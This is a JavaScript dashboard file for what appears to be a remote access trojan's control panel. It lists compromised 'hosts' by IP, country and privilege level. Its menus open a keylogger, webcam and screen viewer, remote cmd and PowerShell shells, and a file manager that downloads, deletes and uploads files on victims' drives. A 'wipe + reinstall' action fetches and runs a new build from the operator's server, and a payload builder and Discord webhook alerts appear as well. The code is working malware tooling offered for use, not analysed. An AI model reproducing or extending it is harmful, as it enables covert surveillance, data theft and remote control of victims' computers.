// language: JavaScript, file: public/js/dashboard.js
const $ = (id) => document.getElementById(id);

let me = null;
const HOST_PAGE_SIZE = 50;
const REMOTE_PAGE_SIZE = 50;
const state = {
  hosts:  { offset: 0, q: '', status: 'all' },
  remote: { offset: 0, q: '' },
};
let pollTimer = null;
let pollIntervalMs = 3000;

let filePath = "C:\\";

async function loadMe() {
  const r = await fetch('/api/me');
  if (r.status === 401) { location.href = '/signin.html'; return; }
  me = await r.json();
  $('who').textContent = me.username;
  $('ov-akey').textContent = me.accountKey;
  $('ov-since').textContent = new Date(me.createdAt).toLocaleDateString();
  $('ov-wh').textContent = me.discordWebhook ? 'connected' : '—';
  $('whurl').value = me.discordWebhook || '';
  $('a-user').textContent = me.username;
  $('a-mail').textContent = me.email;
  $('a-akey').textContent = me.accountKey;
  revealSetup('a-ltok', me.loginToken);
}

function revealSetup(id, value) {
  const el = $(id);
  if (!el) return;
  el.dataset.real = value;
  el.dataset.shown = '0';
  el.textContent = '•'.repeat(value.length);
}

document.addEventListener('click', (e) => {
  const b = e.target.closest('[data-reveal]');
  if (!b) return;
  const el = $(b.dataset.reveal);
  if (!el) return;
  const shown = el.dataset.shown === '1';
  if (shown) {
    el.textContent = '•'.repeat(el.dataset.real.length);
    el.dataset.shown = '0';
    b.textContent = 'reveal';
  } else {
    el.textContent = el.dataset.real;
    el.dataset.shown = '1';
    b.textContent = 'hide';
  }
});

document.querySelectorAll('.nav a').forEach((a) => {
  a.addEventListener('click', () => {
    document.querySelectorAll('.nav a').forEach((x) => x.classList.remove('active'));
    document.querySelectorAll('.section').forEach((x) => x.classList.remove('active'));
    a.classList.add('active');
    $(a.dataset.tab).classList.add('active');
    const tab = a.dataset.tab;
    if (tab === 'overview') { pollIntervalMs = 3000; loadOverview(); startPolling(); }
    else if (tab === 'hosts') { pollIntervalMs = 5000; loadHosts(); startPolling(); }
    else if (tab === 'remote') { pollIntervalMs = 8000; loadRemote(); startPolling(); }
    else if (tab === 'builder') { stopPolling(); }
    else stopPolling();
  });
});

function stopPolling() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
function startPolling() {
  stopPolling();
  pollTimer = setInterval(() => {
    const active = document.querySelector('.nav a.active')?.dataset.tab;
    if (active === 'overview') loadOverview();
    else if (active === 'hosts') loadHosts();
    else if (active === 'remote') loadRemote();
  }, pollIntervalMs);
}

async function loadOverview() {
  const r = await fetch('/api/clients?limit=1&offset=0');
  if (!r.ok) return;
  const d = await r.json();
  $('ov-online').textContent = d.online;
  $('ov-offline').textContent = d.offline;
  $('ov-total').textContent = d.total;
}

function fmtAgo(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

function fmtPing(ms) {
  if (ms === null || ms === undefined) return '—';
  return `${ms} ms`;
}

function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;',
  }[c]));
}

function humanSize(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1024 / 1024).toFixed(2)} MB`;
}

function countryCell(c) {
  if (!c || !c.name) return `<span class="country"><span class="country-empty">—</span></span>`;
  const flag = c.flag ? `<span class="country-flag">${esc(c.flag)}</span>` : '';
  return `<span class="country">${flag}<span class="country-name">${esc(c.name)}</span></span>`;
}

function privBadge(p) {
  const label = esc(p || 'admin');
  return `<span class="priv-badge">${label}</span>`;
}

// ---------- HOSTS ----------
async function loadHosts() {
  const s = state.hosts;
  const q = new URLSearchParams({
    status: s.status, q: s.q, limit: String(HOST_PAGE_SIZE), offset: String(s.offset),
  });
  const r = await fetch('/api/clients?' + q);
  if (!r.ok) return;
  const d = await r.json();
  $('h-count').textContent = `${d.total} total · ${d.online} online · ${d.offline} offline`;

  const host = $('h-rows');
  host.innerHTML = '';
  if (d.rows.length === 0) {
    host.innerHTML = '<div class="empty"><svg viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><line x1="6" x2="6.01" y1="6" y2="6"/><line x1="6" x2="6.01" y1="18" y2="18"/></svg>no hosts</div>';
  } else {
    d.rows.forEach(c => host.appendChild(buildRow(c, () => openHostDetail(c))));
  }

  const page = Math.floor(s.offset / HOST_PAGE_SIZE) + 1;
  const pages = Math.max(1, Math.ceil(d.total / HOST_PAGE_SIZE));
  $('h-page').textContent = `page ${page} / ${pages}`;
  $('h-prev').disabled = s.offset === 0;
  $('h-next').disabled = s.offset + HOST_PAGE_SIZE >= d.total;
}

function buildRow(c, onOpen) {
  const el = document.createElement('div');
  el.className = 'row';
  el.innerHTML = `
    <span class="dot ${c.online ? 'on' : 'off'}"></span>
    <span class="host">${esc(c.hostname)}</span>
    <span class="ip">${esc(c.ip)}</span>
    ${countryCell(c.country)}
    <span class="seen">${fmtAgo(c.lastSeen)}</span>
    <span class="actions"><button class="ghost mini" data-open>view</button></span>`;
  el.addEventListener('click', (e) => {
    if (!e.target.closest('button') || e.target.closest('[data-open]')) onOpen();
  });
  return el;
}

async function openHostDetail(c) {
  $('drawer-title').textContent = c.hostname;
  const box = $('drawer-content');

  box.innerHTML = `
    <div class="detail">
      <div class="sub" style="margin:0;color:var(--muted)">${esc(c.ip)}</div>

      <div class="kv">
        <div class="k">client id</div> <div class="v">${c.id}</div>
        <div class="k">state</div>     <div class="v plain" style="color:${c.online ? 'var(--green)' : 'var(--muted)'}">${c.online ? 'online' : 'offline'}</div>
        <div class="k">ipv4</div>      <div class="v">${esc(c.ip)}</div>
        <div class="k">country</div>   <div class="v plain">${c.country ? esc(c.country.flag + ' ' + c.country.name) : '—'}</div>
        <div class="k">last seen</div> <div class="v plain">${new Date(c.lastSeen).toLocaleString()}</div>
      </div>

      <div style="display:flex;gap:8px;margin-top:24px;flex-wrap:wrap">
        <button class="ghost mini" data-files>open files</button>
        <button class="ghost mini" data-remote>go to remote</button>
        <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
      </div>

      <h3 style="margin-top:28px;font-size:14px;border-bottom:1px solid var(--line);padding-bottom:8px;">uploads</h3>
      <div id="u-list" style="margin-top:12px;"><div class="note">loading…</div></div>
    </div>`;

  $('drawer').classList.add('open');
  $('drawer-backdrop').classList.add('open');

  box.querySelector('[data-remote]').addEventListener('click', () => {
    closeDrawer();
    document.querySelector('.nav a[data-tab="remote"]')?.click();
    state.remote.q = c.hostname;
    $('r-search').value = c.hostname;
    loadRemote();
  });
  box.querySelector('[data-files]').addEventListener('click', () => {
    openFileManager(c);
  });
  box.querySelector('[data-del]').addEventListener('click', async () => {
    if (!confirm(`delete ${c.hostname}?`)) return;
    const r = await fetch(`/api/clients/${c.id}`, { method: 'DELETE' });
    if (r.ok) { closeDrawer(); loadHosts(); }
  });

  await loadUploads(c.id, box.querySelector('#u-list'));
}

async function loadUploads(clientId, container) {
  const r = await fetch(`/api/clients/${clientId}/uploads`);
  if (!r.ok) { container.innerHTML = '<div class="note">failed to load</div>'; return; }
  const rows = await r.json();
  container.innerHTML = '';
  if (rows.length === 0) {
    container.innerHTML = '<div class="note">no uploads yet.</div>';
    return;
  }
  rows.forEach(u => {
    const el = document.createElement('div');
    el.className = 'upload-row';
    el.innerHTML = `
      <div>
        <div class="name">${esc(u.filename)}</div>
        <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
      </div>
      <button class="ghost mini" data-dl>download</button>`;
    el.querySelector('[data-dl]').addEventListener('click', () => {
      location.href = `/api/uploads/${u.id}/download`;
    });
    container.appendChild(el);
  });
}

// ---------- FILE MANAGER ----------
// sends shell="file" commands and polls the commands table for the result.
// rejects on http error, bad response, missing commandId, or 2-minute timeout.
async function runFileOp(clientId, action, path, extra = {}) {
  const payload = JSON.stringify({ action, path, ...extra });
  const r = await fetch(`/api/clients/${clientId}/exec`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ shell: 'file', line: payload }),
  });
  if (!r.ok) {
    const d = await r.json().catch(() => ({}));
    throw new Error(d.error || `http ${r.status}`);
  }
  const d = await r.json();
  if (d.error) throw new Error(d.error);
  if (!d.commandId) throw new Error('no commandId returned');

  const cmdId = d.commandId;
  const deadline = Date.now() + 120_000;
  while (Date.now() < deadline) {
    await new Promise(res => setTimeout(res, 500));
    try {
      const rows = await (await fetch(`/api/clients/${clientId}/commands`)).json();
      const c = rows.find(x => x.id === cmdId);
      if (c && c.status === 'done') return c.output || '';
    } catch {}
  }
  throw new Error('timeout — client did not respond');
}

let fileClient = null;

async function openFileManager(c) {
  fileClient = c;
  filePath = "C:\\";
  $('drawer-title').textContent = `Files: ${c.hostname}`;
  $('drawer').classList.add('open');
  $('drawer-backdrop').classList.add('open');
  await renderFileList();
}

async function renderFileList() {
  const box = $('drawer-content');
  box.innerHTML = `
    <div style="display:flex;gap:8px;margin-bottom:16px;">
      <button class="ghost mini" id="file-up">up</button>
      <input id="file-path" value="${esc(filePath)}" style="flex:1;padding:6px 12px;font-size:13px;font-family:var(--mono);">
      <button class="ghost mini" id="file-go">go</button>
      <button class="ghost mini" id="file-upload-btn" style="border-color:var(--green);color:var(--green)">upload</button>
      <input type="file" id="file-upload-input" style="display:none">
    </div>
    <div id="file-list" style="display:flex;flex-direction:column;gap:6px;">
      <div class="note">loading…</div>
    </div>
  `;

  const joinPath = (base, name) => base.endsWith('\\') ? base + name : base + '\\' + name;

  const updateList = async () => {
    $('file-path').value = filePath;
    $('file-list').innerHTML = '<div class="note">loading…</div>';

    let res;
    try {
      res = await runFileOp(fileClient.id, 'list', filePath);
    } catch (e) {
      $('file-list').innerHTML = `<div class="err">failed: ${esc(e.message)}</div>`;
      return;
    }

    if (!res || !res.startsWith('b64:')) {
      $('file-list').innerHTML = `<div class="err">failed: ${esc(res || 'no response')}</div>`;
      return;
    }

    let data;
    try { data = JSON.parse(atob(res.slice(4))); }
    catch { $('file-list').innerHTML = '<div class="err">bad payload from client</div>'; return; }

    if (!data.ok) {
      $('file-list').innerHTML = '<div class="err">failed to list dir</div>';
      return;
    }

    const list = $('file-list');
    list.innerHTML = '';

    if (data.items.length === 0) {
      list.innerHTML = '<div class="note">folder is empty</div>';
      return;
    }

    data.items.sort((a, b) => {
      if (a.dir && !b.dir) return -1;
      if (!a.dir && b.dir) return 1;
      return a.name.localeCompare(b.name);
    });

    data.items.forEach(item => {
      const full = joinPath(filePath, item.name);
      const row = document.createElement('div');
      row.style.cssText = "display:flex; justify-content:space-between; align-items:center; padding:8px 12px; background:var(--bg); border:1px solid var(--line); border-radius:var(--r-sm); font-size:13px; cursor:pointer;";
      row.innerHTML = `
        <div style="display:flex; align-items:center; gap:10px; overflow:hidden; min-width:0;">
          <svg class="icon" viewBox="0 0 24 24" style="width:14px;height:14px;flex-shrink:0; fill:none; stroke:${item.dir ? 'var(--accent)' : 'var(--muted)'}; stroke-width:2; stroke-linecap:round; stroke-linejoin:round;">
            ${item.dir
              ? '<path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/>'
              : '<path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/>'}
          </svg>
          <span style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${esc(item.name)}</span>
        </div>
        <div style="display:flex; gap:6px; align-items:center; flex-shrink:0;">
          <span style="color:var(--muted); font-size:11px; font-family:var(--mono); min-width:60px; text-align:right;">${item.dir ? 'DIR' : humanSize(item.size)}</span>
          <span class="fm-actions"></span>
        </div>
      `;

      const actions = row.querySelector('.fm-actions');

      if (!item.dir) {
        const dl = document.createElement('button');
        dl.className = 'ghost mini';
        dl.textContent = '↓';
        dl.title = 'download';
        dl.style.cssText = 'padding:2px 8px; min-width:26px;';
        dl.addEventListener('click', async (e) => {
          e.stopPropagation();
          dl.disabled = true; dl.textContent = '…';
          try {
            const b64 = await runFileOp(fileClient.id, 'download', full);
            if (!b64.startsWith('b64:')) throw new Error(b64);
            const bin = atob(b64.slice(4));
            const bytes = new Uint8Array(bin.length);
            for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
            const blob = new Blob([bytes], { type: 'application/octet-stream' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = item.name;
            document.body.appendChild(a); a.click(); a.remove();
            setTimeout(() => URL.revokeObjectURL(url), 2000);
            dl.textContent = '✓';
          } catch { dl.textContent = '!'; }
          setTimeout(() => { dl.textContent = '↓'; dl.disabled = false; }, 1000);
        });
        actions.appendChild(dl);
      }

      const del = document.createElement('button');
      del.className = 'ghost mini';
      del.textContent = '✕';
      del.title = 'delete';
      del.style.cssText = 'padding:2px 8px; min-width:26px; border-color:rgba(248,113,113,.35); color:var(--red);';
      del.addEventListener('click', async (e) => {
        e.stopPropagation();
        if (!confirm(`delete ${item.name}?`)) return;
        del.disabled = true; del.textContent = '…';
        try {
          const out = await runFileOp(fileClient.id, 'delete', full);
          if (out === 'ok') { updateList(); }
          else { del.textContent = '!'; }
        } catch { del.textContent = '!'; }
        setTimeout(() => { del.textContent = '✕'; del.disabled = false; }, 1000);
      });
      actions.appendChild(del);

      row.addEventListener('click', (e) => {
        if (e.target.closest('button')) return;
        if (item.dir) {
          filePath = full;
          updateList();
        }
      });

      list.appendChild(row);
    });
  };

  $('file-up').addEventListener('click', () => {
    if (filePath.length <= 3) return;
    const parts = filePath.replace(/\\$/, '').split('\\');
    parts.pop();
    filePath = parts.join('\\') + '\\';
    if (filePath === '') filePath = 'C:\\';
    updateList();
  });

  $('file-go').addEventListener('click', () => {
    filePath = $('file-path').value || 'C:\\';
    updateList();
  });

  $('file-path').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') { filePath = $('file-path').value || 'C:\\'; updateList(); }
  });

  $('file-upload-btn').addEventListener('click', () => $('file-upload-input').click());

  $('file-upload-input').addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file) return;

    const btn = $('file-upload-btn');
    btn.textContent = '…';
    btn.disabled = true;

    try {
      const dataUrl = await new Promise((res, rej) => {
        const rd = new FileReader();
        rd.onload = () => res(rd.result);
        rd.onerror = rej;
        rd.readAsDataURL(file);
      });
      const b64 = String(dataUrl).split(',')[1] || '';
      const out = await runFileOp(fileClient.id, 'upload', filePath, { name: file.name, data: b64 });
      if (out === 'ok') { updateList(); }
      else { alert(`upload failed: ${out}`); }
    } catch (err) {
      alert(`upload failed: ${err.message}`);
    } finally {
      btn.textContent = 'upload';
      btn.disabled = false;
      e.target.value = '';
    }
  });

  updateList();
}

function closeDrawer() {
  $('drawer').classList.remove('open');
  $('drawer-backdrop').classList.remove('open');
}

$('drawer-close').addEventListener('click', closeDrawer);
$('drawer-backdrop').addEventListener('click', closeDrawer);
document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeDrawer(); });

// ---------- REMOTE ----------
async function loadRemote() {
  const s = state.remote;
  const q = new URLSearchParams({
    status: 'online', q: s.q, limit: String(REMOTE_PAGE_SIZE), offset: String(s.offset),
  });
  const r = await fetch('/api/clients?' + q);
  if (!r.ok) return;
  const d = await r.json();
  $('r-count').textContent = `${d.online} online`;

  const host = $('r-rows');
  host.innerHTML = '';
  if (d.rows.length === 0) {
    host.innerHTML = '<div class="empty"><svg viewBox="0 0 24 24"><path d="M18 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3Z"/><path d="M6 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3Z"/><path d="M10 9h4"/><path d="M10 15h4"/></svg>no online clients</div>';
  } else {
    d.rows.forEach(c => host.appendChild(buildRemoteRow(c)));
  }

  const page = Math.floor(s.offset / REMOTE_PAGE_SIZE) + 1;
  const pages = Math.max(1, Math.ceil(d.online / REMOTE_PAGE_SIZE));
  $('r-page').textContent = `page ${page} / ${pages}`;
  $('r-prev').disabled = s.offset === 0;
  $('r-next').disabled = s.offset + REMOTE_PAGE_SIZE >= d.online;
}

function buildRemoteRow(c) {
  const el = document.createElement('div');
  el.className = 'row remote-row';
  el.innerHTML = `
    <span class="dot on"></span>
    <span class="host">${esc(c.hostname)}</span>
    <span class="ip">${esc(c.ip)}</span>
    ${countryCell(c.country)}
    <span class="priv">${privBadge(c.privileges)}</span>
    <span class="ping">${fmtPing(c.ping)}</span>
    <span class="seen">${fmtAgo(c.lastSeen)}</span>
    <span class="actions" style="position:relative">
      <button class="ghost mini" data-gear title="actions" style="padding:4px 10px">
        <svg class="icon" viewBox="0 0 24 24" style="width:14px;height:14px;"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg>
      </button>
    </span>`;
  el.querySelector('[data-gear]').addEventListener('click', (e) => {
    e.stopPropagation();
    openGearMenu(e.currentTarget, c);
  });
  return el;
}

let gearMenuEl = null;
function closeGearMenu() { if (gearMenuEl) { gearMenuEl.remove(); gearMenuEl = null; } }
document.addEventListener('click', closeGearMenu);

function openGearMenu(anchor, c) {
  closeGearMenu();
  const rect = anchor.getBoundingClientRect();
  const menu = document.createElement('div');
  menu.className = 'gear-menu';
  menu.style.top  = `${rect.bottom + 4}px`;
  menu.style.left = `${rect.right - 240}px`;
  menu.innerHTML = `
    <div class="title">${esc(c.hostname)}</div>
    <div class="item" data-item="rdp">screen (rdp)</div>
    <div class="item" data-item="webcam">webcam</div>
    <div class="item" data-item="keylog">keylogger</div>
    <div class="item" data-item="files">file manager</div>
    <div class="sep"></div>
    <div class="item" data-item="cmd">remote shell — cmd</div>
    <div class="item" data-item="ps">remote shell — powershell</div>
    <div class="sep"></div>
    <div class="item" data-item="wipe" style="color:var(--red)">wipe + reinstall</div>
  `;
  menu.querySelectorAll('[data-item]').forEach((el) => {
    el.addEventListener('click', (ev) => {
      ev.stopPropagation();
      closeGearMenu();
      const it = el.dataset.item;
      if (it === 'rdp') openRdp(c);
      else if (it === 'webcam') openWebcam(c);
      else if (it === 'keylog') openKeylog(c);
      else if (it === 'cmd') openConsole(c, 'cmd');
      else if (it === 'ps') openConsole(c, 'powershell');
      else if (it === 'wipe') wipeClient(c);
      else if (it === 'files') openFileManager(c);
    });
  });
  document.body.appendChild(menu);
  gearMenuEl = menu;
}

async function wipeClient(c) {
  const ok = confirm(
    `wipe + reinstall on ${c.hostname}?\n\n` +
    `this stops every running component, wipes the install, ` +
    `downloads a fresh build from your server, and runs it.\n\n` +
    `the client will disappear for 15–30s, then come back.`
  );
  if (!ok) return;

  const r = await fetch(`/api/clients/${c.id}/wipe`, {
    method: 'POST',
    credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
  });
  const d = await r.json().catch(() => ({}));
  if (r.ok) {
    alert(`wipe command queued for ${c.hostname}\n\nthe client will pick it up within ~3s.`);
  } else {
    alert(`failed: ${d.error || r.status}`);
  }
}

function openConsole(c, shell) {
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd' });
  window.open('/cmd.html?' + q.toString(), '_blank', 'width=1000,height=640');
}

function openRdp(c) {
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
  window.open('/rdp.html?' + q.toString(), '_blank', 'width=1200,height=760');
}

function openWebcam(c) {
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
  window.open('/webcam.html?' + q.toString(), '_blank', 'width=1000,height=700');
}

function openKeylog(c) {
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
  window.open('/keylog.html?' + q.toString(), '_blank', 'width=1000,height=700');
}

// ---------- toolbar wiring ----------
function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }

$('h-search').addEventListener('input', debounce((e) => { state.hosts.q = e.target.value; state.hosts.offset = 0; loadHosts(); }, 220));
$('h-status').addEventListener('change', (e) => { state.hosts.status = e.target.value; state.hosts.offset = 0; loadHosts(); });
$('h-refresh').addEventListener('click', () => { state.hosts.offset = 0; loadHosts(); });
$('h-prev').addEventListener('click', () => { state.hosts.offset = Math.max(0, state.hosts.offset - HOST_PAGE_SIZE); loadHosts(); });
$('h-next').addEventListener('click', () => { state.hosts.offset += HOST_PAGE_SIZE; loadHosts(); });

$('r-search').addEventListener('input', debounce((e) => { state.remote.q = e.target.value; state.remote.offset = 0; loadRemote(); }, 220));
$('r-refresh').addEventListener('click', () => { state.remote.offset = 0; loadRemote(); });
$('r-prev').addEventListener('click', () => { state.remote.offset = Math.max(0, state.remote.offset - REMOTE_PAGE_SIZE); loadRemote(); });
$('r-next').addEventListener('click', () => { state.remote.offset += REMOTE_PAGE_SIZE; loadRemote(); });

// ---------- settings ----------
$('whtest').addEventListener('click', async () => {
  $('wherr').textContent = '';
  const r = await fetch('/api/webhook/test', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: $('whurl').value.trim() }),
  });
  const d = await r.json().catch(() => ({}));
  $('wherr').textContent = r.ok ? 'webhook live' : (d.error || 'failed');
  if (r.ok) $('ov-wh').textContent = 'connected';
});

$('logout').addEventListener('click', async () => {
  await fetch('/api/logout', { method: 'POST' });
  location.href = '/signin.html';
});

loadMe();
loadOverview();
startPolling();